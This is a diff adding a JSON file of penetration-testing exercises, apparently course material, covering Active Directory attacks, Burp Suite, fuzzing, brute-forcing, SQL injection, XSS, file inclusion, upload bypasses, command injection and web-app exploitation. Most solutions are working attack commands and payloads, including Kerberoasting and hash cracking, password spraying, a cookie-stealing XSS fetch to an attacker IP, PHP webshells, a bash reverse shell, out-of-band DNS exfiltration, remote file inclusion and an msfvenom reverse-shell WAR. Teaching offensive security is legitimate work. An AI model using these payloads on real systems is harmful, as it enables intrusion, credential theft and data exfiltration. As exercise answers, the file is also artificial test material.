@@ -1,0 +1,457 @@
+[
+  {
+    "module_id": 12,
+    "prompt": "Identify Kerberoastable Users",
+    "solution": "1. Import PowerView: `. .\\PowerView.ps1`\n2. Run `Get-DomainUser -SPN` to list all domain users with a registered Service Principal Name (SPN).\n3. Use `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>` to extract the TGS ticket for offline cracking.",
+    "difficulty": "Medium",
+    "hints": ["Look for the `-SPN` flag in PowerView."]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Find AS-REP Roastable Users",
+    "solution": "1. Import PowerView.\n2. Run `Get-DomainUser -PreauthNotRequired` to find users who do not require Kerberos pre-authentication.\n3. Request the AS-REP using `impacket-GetNPUsers <DOMAIN>/ -usersfile <users.txt> -dc-ip <DC_IP> -no-pass`.",
+    "difficulty": "Medium",
+    "hints": ["Focus on accounts where pre-authentication is disabled."]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Enumerate Local Admin Access via PowerView",
+    "solution": "1. Ensure you have a valid user context.\n2. In PowerShell, run `Find-LocalAdminAccess` from PowerView.\n3. The script will query Domain Machines and check if the current user token has Local Administrator rights on any systems.",
+    "difficulty": "Medium",
+    "hints": ["There's a specific PowerView cmdlet named Find-LocalAdminAccess."]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Run BloodHound Collection from Linux",
+    "solution": "1. Install BloodHound python ingestor: `pipx install bloodhound`.\n2. Run: `bloodhound-python -u <user> -p <password> -d <domain> -ns <DC_IP> -c All`.\n3. Upload the resulting JSON files to the BloodHound Neo4j database GUI.",
+    "difficulty": "Medium",
+    "hints": ["Use the Python ingestor if working from a Linux attack box."]
+  },
+  {
+    "module_id": 12,
+    "prompt": "Enumerate Domain password policy using external tools",
+    "solution": "1. Using CME or nxc: `nxc smb <DC_IP> -u <user> -p <pass> --pass-pol`.\n2. Alternately, use `rpcclient -U <user> <DC_IP>` and type `getdompwinfo`.\n3. Review the minimum length and lockout threshold parameters.",
+    "difficulty": "Easy",
+    "hints": ["NetExec (nxc) has a flag specifically for password policies."]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Perform Kerberoasting with Impacket",
+    "solution": "1. Gather credentials for any valid domain user.\n2. Run `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request -outputfile hashes.txt`.\n3. Crack the hashes with Hashcat: `hashcat -m 13100 hashes.txt wordlist.txt`.",
+    "difficulty": "Medium",
+    "hints": ["Use the -request flag to save TGS tickets."]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Execute an AS-REP Roasting attack",
+    "solution": "1. Put target usernames in `users.txt`.\n2. Run `impacket-GetNPUsers <Domain>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat > asrep.txt`.\n3. Use `hashcat -m 18200 asrep.txt rockyou.txt` to crack the AS-REP responses.",
+    "difficulty": "Medium",
+    "hints": ["Impacket-GetNPUsers is the right tool for AS-REP roasting."]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Verify Domain Credentials using NetExec (nxc)",
+    "solution": "1. Collect target IP or subnet.\n2. Run `nxc smb <Target_IP> -u <Username> -p <Password>`.\n3. Look for the `[+]` or `Pwn3d!` tag indicating successful authentication or Admin privileges respectively.",
+    "difficulty": "Easy",
+    "hints": ["NetExec checks SMB authentication by default."]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Abuse GenericWrite over a User Object",
+    "solution": "1. If User A has GenericWrite over User B, configure a fake SPN on User B.\n2. PowerView: `Set-DomainObject -Identity <UserB> -Set @{serviceprincipalname='ops/fake'}`.\n3. User B is now Kerberoastable. Use `impacket-GetUserSPNs` to extract User B's hash.",
+    "difficulty": "Hard",
+    "hints": ["GenericWrite allows you to write the SPN attribute."]
+  },
+  {
+    "module_id": 13,
+    "prompt": "Perform an automated Password Spray against SMB",
+    "solution": "1. Collect a list of potential usernames (`users.txt`).\n2. Run `nxc smb <DC_IP> -u users.txt -p 'Welcome123!' --continue-on-success`.\n3. Review output for specific locked accounts or successful logins across the username list.",
+    "difficulty": "Medium",
+    "hints": ["Use --continue-on-success to ensure it checks every user."]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Setup FoxyProxy to intercept traffic using Burp Suite",
+    "solution": "1. Start Burp Suite and configure the Proxy Listener on `127.0.0.1:8080`.\n2. In your browser's FoxyProxy extension, add a proxy pointing to `127.0.0.1` port `8080`.\n3. Enable the proxy in FoxyProxy and verify traffic is hitting Burp's Proxy -> Intercept tab.",
+    "difficulty": "Easy",
+    "hints": ["Ensure the browser proxy matches your Burp listener interface."]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Establish target Scope in Burp Suite",
+    "solution": "1. Navigate to Target -> Scope settings.\n2. Add the target domain prefix (e.g., `.*\\.target\\.com$`).\n3. Click 'Yes' to stop sending out-of-scope traffic to the History and Scanner components.",
+    "difficulty": "Easy",
+    "hints": ["Use regex to include all subdomains."]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Execute an Intruder Cluster Bomb attack",
+    "solution": "1. Send request to Intruder (Ctrl+I).\n2. Highlight `username` and `password` values and click `Add §`.\n3. Set Attack type to `Cluster Bomb`.\n4. Under Payloads, set Payload 1 to user list and Payload 2 to password list.",
+    "difficulty": "Medium",
+    "hints": ["Cluster bomb iterating tests every possible combination of credentials."]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Bypass a source IP filter using Match and Replace",
+    "solution": "1. Go to Proxy -> Options -> Match and Replace.\n2. Add a new rule.\n3. Leave 'Match' blank (or match specific request header), and set 'Replace' to `X-Forwarded-For: 127.0.0.1`.\n4. Send request and observe the injected header bypassing IP restrictions.",
+    "difficulty": "Medium",
+    "hints": ["Use Match and Replace to automatically inject headers like XFF or X-Real-IP."]
+  },
+  {
+    "module_id": 14,
+    "prompt": "Compare HTTP Responses using Comparer",
+    "solution": "1. In Repeater, select the first request's response and send to Comparer (Ctrl+W).\n2. Send a slightly modified request, and send its response to Comparer.\n3. Open Comparer and click 'Words' or 'Bytes'.\n4. Review the highlighted differences indicating a blind SQLi or logic flaw anomaly.",
+    "difficulty": "Medium",
+    "hints": ["Comparer is useful for time delays or minor byte count differences."]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Perform directory fuzzing with ffuf",
+    "solution": "1. Command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ`.\n2. Observe response codes.\n3. Adjust command to filter out false positives using `-fc 404,403` or `-mc 200,301,302`.",
+    "difficulty": "Easy",
+    "hints": ["Use the FUZZ keyword in the URL."]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz virtual hosts (VHosts) using ffuf",
+    "solution": "1. Command: `ffuf -w subdomains.txt -u http://target.com -H 'Host: FUZZ.target.com'`.\n2. Note the standard default response size.\n3. Add `-fs <size>` to the command to filter out the noise and only show active VHosts.",
+    "difficulty": "Medium",
+    "hints": ["Inject the FUZZ keyword into the Host header rather than the URL path."]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz parameters in a GET request",
+    "solution": "1. Command: `ffuf -w parameters.txt -u http://target.com/page.php?FUZZ=test`.\n2. Look for anomalies in response length `-fs <default_size>` to identify valid hidden parameters.\n3. Test the identified parameter for vulnerabilities like XSS or LFI.",
+    "difficulty": "Medium",
+    "hints": ["Use a parameter wordlist like burp-parameter-names.txt."]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Fuzz POST data structures with ffuf",
+    "solution": "1. Command: `ffuf -w wordlist.txt -u http://target.com/api/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'`.\n2. Filter responses to look for 200 OK or 302 Redirect indicating successful login.",
+    "difficulty": "Hard",
+    "hints": ["Specify `-X POST` and provide the data via `-d`."]
+  },
+  {
+    "module_id": 15,
+    "prompt": "Perform extension fuzzing to find backup files",
+    "solution": "1. Once a valid directory or file root is discovered, perform fuzzing to locate backups.\n2. Command: `ffuf -w config.txt -e .bak,.txt,.old,.zip -u http://target.com/FUZZ`.\n3. This automatically tests combinations like config.php.bak or config.zip.",
+    "difficulty": "Medium",
+    "hints": ["The `-e` flag takes a comma-separated list of extensions."]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Use Hydra to bruteforce HTTP POST login forms",
+    "solution": "1. Identify form parameters via Burp Suite.\n2. Command: `hydra -l admin -P rockyou.txt target.com http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid password'`.\n3. Wait for Hydra to identify combinations that bypass the 'Invalid password' failure string.",
+    "difficulty": "Medium",
+    "hints": ["Correct identification of the failure string is critical."]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Bruteforce an SSH service using Hydra",
+    "solution": "1. Define Target: `hydra -l root -P passwords.txt ssh://<TARGET_IP>`.\n2. Add `-t 4` to reduce thread count to prevent breaking the SSH daemon.\n3. Review the green text output indicating valid credentials.",
+    "difficulty": "Easy",
+    "hints": ["Specify `ssh://` protocol directly in the target."]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Generate a custom wordlist using cewl",
+    "solution": "1. Run `cewl http://target.com -d 3 -m 5 -w custom.txt`.\n2. This crawls depth 3, keeping words of at least 5 characters.\n3. Modify words using Hashcat rules (e.g., `-r best64.rule`) to expand permutations.",
+    "difficulty": "Medium",
+    "hints": ["cewl scrapes a website for likely corporate password terms."]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Perform a credential-based spray via RDP",
+    "solution": "1. Use `nxc smb <IP> -u users.txt -p pass.txt` to find working valid AD accounts.\n2. Then attempt RDP access via `nxc rdp <IP> -u user -p pass`.\n3. Alternatively use `hydra -L users.txt -p password123 rdp://<TARGET_IP>`.",
+    "difficulty": "Medium",
+    "hints": ["Valid accounts don't inherently possess RDP rights; verify using RDP specific checks."]
+  },
+  {
+    "module_id": 16,
+    "prompt": "Identify default application credentials",
+    "solution": "1. Enumerate the service version (e.g. Tomcat 9.0).\n2. Search Default-Password databases or manuals.\n3. Try `tomcat:tomcat`, `admin:admin`, `admin:<blank>`. Proceed with bruteforce *only* after default tests fail.",
+    "difficulty": "Easy",
+    "hints": ["Always try standards like admin/admin before wasting time bruteforcing."]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Detect Error-based SQL Injection",
+    "solution": "1. Append a single quote `'` to the URL parameter `id=1'`.\n2. Look for database errors in the response, such as `You have an error in your SQL syntax`.\n3. The error confirms the application is not sanitizing input before sending to the database.",
+    "difficulty": "Easy",
+    "hints": ["The single quote breaks string encapsulation."]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Determine Column Counts with ORDER BY",
+    "solution": "1. Inject `1' ORDER BY 1-- -` to the vulnerable parameter.\n2. Increment the number (`ORDER BY 2`, `ORDER BY 3`, etc.).\n3. The exact column count is found when `ORDER BY N` errors out (meaning N-1 is valid).",
+    "difficulty": "Medium",
+    "hints": ["Increase the ORDER BY integer until a database error occurs."]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Extract database names via UNION SELECT",
+    "solution": "1. Assuming a 3-column table, use: `1' UNION SELECT 1,database(),3-- -`.\n2. For identifying tables, use `1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -`.\n3. Observe the output rendered directly in the webpage.",
+    "difficulty": "Hard",
+    "hints": ["Ensure the number of outputs matches the column count from ORDER BY."]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Identify Time-Based Blind SQLi in MySQL",
+    "solution": "1. Inject `1'; SELECT SLEEP(5)-- -`.\n2. Observe the browser or proxy loading time. If it delays by exactly 5 seconds, it's vulnerable to time-based injection.\n3. Use conditional logic: `1' AND (SELECT IF(1=1, SLEEP(5), 0))-- -`.",
+    "difficulty": "Medium",
+    "hints": ["Use SLEEP() for MySQL or WAITFOR DELAY for MSSQL."]
+  },
+  {
+    "module_id": 17,
+    "prompt": "Exploit Second-Order SQLi",
+    "solution": "1. Inject payload into an initial profile setting, such as a Username: `admin'-- `.\n2. Save the settings. The query safely stores the payload.\n3. Visit a secondary page where the application queries the username without escaping, effectively executing the payload.",
+    "difficulty": "Hard",
+    "hints": ["Second-order SQLi relies on payloads stored safely at rest and executed unsafely later."]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Run basic SQLMap enumeration on a GET parameter",
+    "solution": "1. Run `sqlmap -u 'http://target.com/vuln.php?id=1' --batch`.\n2. Identify the parameter type and payload confirmed by tool.\n3. Add `--dbs` to retrieve database names.",
+    "difficulty": "Easy",
+    "hints": ["The `--batch` flag avoids interactive prompts during execution."]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Use SQLMap with Burp Suite request files",
+    "solution": "1. In Burp, right-click a captured request containing cookies/POST data and 'Save Item'.\n2. Run `sqlmap -r request.txt -p username --batch`.\n3. This isolates the `username` parameter for testing while maintaining correct session cookies.",
+    "difficulty": "Medium",
+    "hints": ["Save the request via Burp and use `-r <file>`."]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Extract specific table columns using SQLMap",
+    "solution": "1. Once the DB and Table are found, target them explicitly.\n2. Command: `sqlmap -u '<url>' -D <database_name> -T <table_name> --columns`.\n3. Then execute a dump: `sqlmap -D <db> -T <table> -C user,password --dump`.",
+    "difficulty": "Medium",
+    "hints": ["Use -D for database, -T for table, -C for columns."]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Increase verbosity and risk levels to catch complex injections",
+    "solution": "1. Command: `sqlmap -u '<url>' --level=5 --risk=3`.\n2. This configuration tests HTTP Headers (like User-Agent) and uses heavy OR-based logic and extended delays.\n3. Only use on authorized environments as risk 3 modifies database tables.",
+    "difficulty": "Hard",
+    "hints": ["Level goes to 5, Risk goes to 3."]
+  },
+  {
+    "module_id": 18,
+    "prompt": "Achieve RCE via SQLMap OS Shell",
+    "solution": "1. Ensure MySQL server has `FILE` privileges and a writable web root path.\n2. Command `sqlmap -u '<url>' --os-shell`.\n3. Provide the webroot path (e.g. `/var/www/html`) and interact with the resulting webshell staging prompt.",
+    "difficulty": "Hard",
+    "hints": ["The `--os-shell` flag allows writing a stager to a webroot."]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Identify Stored XSS in a comment form",
+    "solution": "1. Submit a generic payload: `<script>alert(1)</script>` into a comment field.\n2. Reload the page containing the comment.\n3. A popup displaying '1' demonstrates the payload was stored and executed upon browser rendering.",
+    "difficulty": "Easy",
+    "hints": ["Stored XSS triggers persistently across page reloads."]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Steal an Administrator's Cookie via XSS",
+    "solution": "1. Setup an HTTP listener (e.g. `python -m http.server 80`).\n2. Inject payload: `<script>fetch('http://<YOUR_IP>/?cookie=' + document.cookie);</script>`.\n3. When the admin reviews the page, their browser executes the script and logs their session cookie to your server.",
+    "difficulty": "Medium",
+    "hints": ["Use JavaScript `fetch` or `document.location` to send the `document.cookie` variable."]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Bypass basic XSS filters using capitalization and alternative tags",
+    "solution": "1. If `<script>` is blocked, use alternative casings like `<ScRiPt>alert(1)</sCrIpT>`.\n2. If the tag is entirely stripped, use image context: `<img src=x onerror=alert(1)>`.\n3. For SVG vectors, use `<svg onload=alert(1)>`.",
+    "difficulty": "Medium",
+    "hints": ["Use HTML tag handlers like `onerror` or `onload` instead of `<script>` tags."]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Identify and exploit DOM-based XSS",
+    "solution": "1. Identify JavaScript using weak logic: `document.getElementById('name').innerHTML = location.hash`.\n2. Craft URL: `http://target.com/#<img src=x onerror=alert(1)>`.\n3. The vulnerable client-side script parses the fragment and embeds the malicious payload into the DOM.",
+    "difficulty": "Hard",
+    "hints": ["DOM XSS never touches the backend server parsing flow."]
+  },
+  {
+    "module_id": 19,
+    "prompt": "Bypass Content Security Policy (CSP) for XSS execution",
+    "solution": "1. Analyze CSP Headers. If `unsafe-inline` is allowed, generic `<script>` will work.\n2. If strict, utilize allowed domains. E.g. upload a payload file to an allowed CDN endpoint.\n3. Utilize JSONP endpoints from whitelisted domains to callback malicious code.",
+    "difficulty": "Hard",
+    "hints": ["Check the CSP rule restrictions using a tool like Google's CSP Evaluator."]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Execute an LFI traversal to read /etc/passwd",
+    "solution": "1. Identify a file load parameter: `http://target.com/index.php?page=about.html`.\n2. Inject traversal payload: `?page=../../../../../../etc/passwd`.\n3. Ensure response body reveals user accounts like `root:x:0:0:`.",
+    "difficulty": "Easy",
+    "hints": ["Use multiple `../` patterns to exceed directory depth."]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Bypass LFI filename appendage using Null Byte formatting",
+    "solution": "1. In older PHP (<5.3.4), if the backend appends `.php` to your request.\n2. Inject payload: `?page=../../../../etc/passwd%00`.\n3. The backend evaluates it as `/etc/passwd\\0.php`, terminating the string early and reading the passwd file.",
+    "difficulty": "Medium",
+    "hints": ["The `%00` character acts as a string terminator in C-based architectures."]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Utilize PHP Base64 Filter wrapper to extract Source Code",
+    "solution": "1. Identify target PHP file containing logic (e.g. `config.php`).\n2. Inject payload: `?page=php://filter/read=convert.base64-encode/resource=config`.\n3. Decode the returned Base64 string locally to view backend DB references or logic.",
+    "difficulty": "Medium",
+    "hints": ["The `php://filter` wrapper lets you read raw PHP without letting the server execute it first."]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Elevate LFI to RCE using Log Poisoning",
+    "solution": "1. Use netcat or curl to inject PHP into a User-Agent header: `curl -A '<?php system($_GET[\"c\"]); ?>' http://<target>`.\n2. The server records this User-Agent inside `/var/log/apache2/access.log`.\n3. Trigger LFI reading the log: `?page=../../../../var/log/apache2/access.log&c=id`. The injected PHP is parsed and executed.",
+    "difficulty": "Hard",
+    "hints": ["Log poisoning requires read-access over Apache/Nginx or SSH log paths."]
+  },
+  {
+    "module_id": 20,
+    "prompt": "Exploit RFI (Remote File Inclusion)",
+    "solution": "1. Ensure application configuration `allow_url_include=On` is designated.\n2. Setup external attack payload server `http://<YOUR_IP>/shell.php`.\n3. Trigger RFI: `?page=http://<YOUR_IP>/shell.php` to fetch and execute external PHP code.",
+    "difficulty": "Medium",
+    "hints": ["Unlike LFI, RFI incorporates external protocol schemes like HTTP/FTP."]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Bypass Web Server upload filtering using double extensions",
+    "solution": "1. Attempt uploading generic `shell.php` (Blocked).\n2. Rename file to `shell.jpg.php` or `shell.php.jpg`.\n3. If the server only checks the final extension or scans left-to-right, the bypass executes allowing a malicious upload.",
+    "difficulty": "Easy",
+    "hints": ["Combine both valid and malicious extensions to confuse the parser."]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Bypass Content-Type MIME filtering checks",
+    "solution": "1. Catch the upload request using Burp Suite.\n2. Locate the parameter defining the MIME data `Content-Type: application/x-php`.\n3. Modify it manually to `Content-Type: image/jpeg` and forward. The server accepts it mimicking an image despite PHP payload.",
+    "difficulty": "Medium",
+    "hints": ["MIME type validation relies exclusively on header trust."]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Upload a basic PHP webshell for server interaction",
+    "solution": "1. Create payload `<?php system($_REQUEST['cmd']); ?>` inside a file named `shell.php`.\n2. Upload bypassing implemented security checks.\n3. Browse to the upload path: `http://target.com/uploads/shell.php?cmd=whoami`.",
+    "difficulty": "Easy",
+    "hints": ["The `system()` function bridges PHP interaction to bash OS interaction."]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Evade Magic Bytes sequence validation",
+    "solution": "1. Applications check file signatures/magic bytes to confirm legitimacy.\n2. Append valid GIF signatures at the start of your webshell: `GIF89a; <?php system($_GET['cmd']); ?>`.\n3. The backend categorizes the magic bytes as a GIF, successfully storing the PHP shell.",
+    "difficulty": "Medium",
+    "hints": ["Add `GIF89a;` at the beginning of your PHP payload block."]
+  },
+  {
+    "module_id": 21,
+    "prompt": "Exploit configuration overrides using .htaccess uploads",
+    "solution": "1. If allowed, upload a custom `.htaccess` file containing `AddType application/x-httpd-php .jpg`.\n2. Ensure the `.htaccess` resides within the `/uploads/` root.\n3. Upload a standard `payload.jpg` containing PHP code. Apache parses the `.jpg` as executable PHP.",
+    "difficulty": "Hard",
+    "hints": ["The `.htaccess` file redefines execution standards for internal directories."]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Identify Command Injection using string manipulation and delimiters",
+    "solution": "1. Locate parameter interacting with OS contexts (e.g. Ping forms).\n2. Inject `127.0.0.1 ; id`.\n3. Review resulting output showing `uid=xxx gid=xxx`, confirming the semicolons broke command segregation.",
+    "difficulty": "Easy",
+    "hints": ["Use standard shell operators like `;`, `|`, `&&`."]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Confirm Blind Command Injection using time delays",
+    "solution": "1. Inject payload containing time constraints: `127.0.0.1 ; sleep 5`.\n2. Observe if page execution response delays by 5 seconds relative to previous interactions.\n3. The delay confirms active injection without visible text outputs.",
+    "difficulty": "Medium",
+    "hints": ["The `sleep` command halts Linux thread execution."]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Exfiltrate Command data using Out-of-Band (OOB) DNS",
+    "solution": "1. Leverage Burp Collaborator or Interactsh to listen for DNS lookups.\n2. Inject payload: `127.0.0.1 ; nslookup $(whoami).your_domain.com`.\n3. Review Collaborator logs resulting in queries formatted like `www-data.your_domain.com`, indicating execution success.",
+    "difficulty": "Hard",
+    "hints": ["Use subshells like `$()` to nest command output within external lookups."]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Bypass Whitespace/Space filters during injection",
+    "solution": "1. App developer prevents space utilization attempting to stop arguments.\n2. Use the IFS shell variable shortcut: `127.0.0.1;cat${IFS}/etc/passwd`.\n3. Command executes parsing `${IFS}` structurally as space requirements.",
+    "difficulty": "Hard",
+    "hints": ["Look into Bash `$IFS` structural environments or brace expansion `{cat,/etc/passwd}`."]
+  },
+  {
+    "module_id": 22,
+    "prompt": "Upgrade command injection to a full reverse shell",
+    "solution": "1. Open a local netcat listener `nc -nlvp 4444`.\n2. Inject reverse shell payload: `; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'`.\n3. URL Encode parameters using Burp if transmitted via GET parameters. Receive shell.",
+    "difficulty": "Medium",
+    "hints": ["Using `bash -c` encapsulates the network redirection stream to prevent quoting errors."]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Identify Horizontal IDOR logic flaws",
+    "solution": "1. Authenticate to the web application as `User A`.\n2. Monitor API request parameter referencing specific account modifications: `POST /api/user/update HTTP/1.1  {\"id\": 101}`.\n3. Change `101` to `102` (belonging to another user) and observe if the modification succeeds.",
+    "difficulty": "Easy",
+    "hints": ["Modify ID parameters affecting resource definitions outside your scope."]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Exploit Basic XXE to extract local server files",
+    "solution": "1. Identify an endpoint communicating through XML (or converting JSON to XML).\n2. Inject DOCTYPE entity reference: `<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>`.\n3. Call the entity block within XML values: `<user>&xxe;</user>` and observe if `/etc/passwd` reflects in the response.",
+    "difficulty": "Medium",
+    "hints": ["XML vulnerabilities occur when DTDs or external entities aren't constrained safely."]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Confirm CSRF functionality using Cross-Site requests",
+    "solution": "1. Identify specific state-changing activities lacking randomized token parameters (Anti-CSRF).\n2. Generate malicious HTML Payload: `<form action=\"http://bank/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"5000\"></form><script>document.forms[0].submit();</script>`.\n3. Trigger by simulating a victim interacting with the HTML artifact affecting their active session context.",
+    "difficulty": "Medium",
+    "hints": ["CSRF simulates trusted user functionality against endpoints lacking CSRF-token protections."]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Identify Server-Side Request Forgery vulnerabilities",
+    "solution": "1. Locate parameter attempting external application calls (e.g. Image URL load `?url=`).\n2. Change parameter tracking mapping to localhost ports or hidden addresses `url=http://127.0.0.1:22`.\n3. Check error banners verifying interactions or retrieve AWS Metadata instance variables (`http://169.254.169.254/latest/meta-data/`).",
+    "difficulty": "Hard",
+    "hints": ["SSRF coerces the server into making arbitrary external/internal proxy requests."]
+  },
+  {
+    "module_id": 23,
+    "prompt": "Discover Vertical IDOR exploiting privileges",
+    "solution": "1. Perform IDOR interaction, not substituting sibling standard user accounts, but substituting reference to known `/api/admin` functions.\n2. Attempt referencing admin IDs directly or forcing attribute manipulation e.g., `{\"user_role\":\"admin\"}`.\n3. Complete backend functional calls mapped outside your standard privilege access context.",
+    "difficulty": "Medium",
+    "hints": ["Vertical IDOR shifts from modifying equivalent-roles to modifying escalated access values."]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Enumerate specific WordPress parameters iteratively",
+    "solution": "1. Use WPScan for holistic verification: `wpscan --url http://target.com --enumerate u,p,t`.\n2. Output extracts vulnerable plugins (`p`), generic misconfigured themes (`t`), and enumerates standard Users (`u`).",
+    "difficulty": "Easy",
+    "hints": ["WPScan automates the WordPress vulnerability detection ecosystem efficiently."]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Achieve generic RCE on WordPress systems",
+    "solution": "1. Aquire Administrator level privileges to the specific target platform.\n2. Navigate to Appearance -> Theme Editor.\n3. Modify generic core template parts like `404.php` injecting `<?php system($_GET['cmd']); ?>`, then browse to arbitrary non-existent pages issuing shell commands.",
+    "difficulty": "Medium",
+    "hints": ["PHP logic binds inherently to standard core WP-theme configurations within the dashboard."]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Establish Shell execution via generic Jenkins architecture",
+    "solution": "1. Obtain initial access locating the Jenkins script interaction console (`/script`).\n2. Use Groovy constructs to spawn subprocess interaction mapping OS context overrides: `def proc = \"id\".execute(); proc.waitFor(); println proc.in.text`.\n3. Groovy architecture reflects Linux-layer interaction securely.",
+    "difficulty": "Medium",
+    "hints": ["Jenkins script console uses Groovy syntax to encapsulate OS interactions."]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Exploit unconfigured exposed internal repositories (.git)",
+    "solution": "1. Identify directory traversal resulting in `.git/` visibility.\n2. Extract environment repositories mimicking server source components `git-dumper http://target.com/.git/ local_dump`.\n3. Review resulting directory extracting `.env` configs mapping hardcoded passwords.",
+    "difficulty": "Easy",
+    "hints": ["Git metadata is commonly stored unencrypted and improperly restricted on specific production networks."]
+  },
+  {
+    "module_id": 24,
+    "prompt": "Upload malicious payloads via Tomcat applications",
+    "solution": "1. Gather administrative UI access to the specific Apache Tomcat control portal (`/manager/html`).\n2. Create malicious `.war` payload configuration simulating an application module: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`.\n3. Upload within generic Tomcat deployment functions leading to shell generation.",
+    "difficulty": "Hard",
+    "hints": ["Tomcat managers expect `.war` architecture payload formatting."]
+  }
+]
